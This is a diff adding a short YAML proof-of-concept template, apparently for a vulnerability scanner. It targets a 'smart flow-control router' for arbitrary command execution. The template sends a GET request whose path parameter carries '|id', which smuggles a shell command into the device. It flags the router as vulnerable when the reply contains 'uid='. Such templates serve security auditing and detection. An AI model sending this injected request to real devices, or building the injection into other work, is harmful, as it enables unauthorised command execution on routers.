@@ -1,0 +1,9 @@
+name: poc-yaml-智能流控路由器-cmd
+description: "任意命令执行"
+method: GET
+path:
+  - /goform/webRead/open/?path=|id
+expression:
+  status: 200
+  body_all:
+    - "uid="
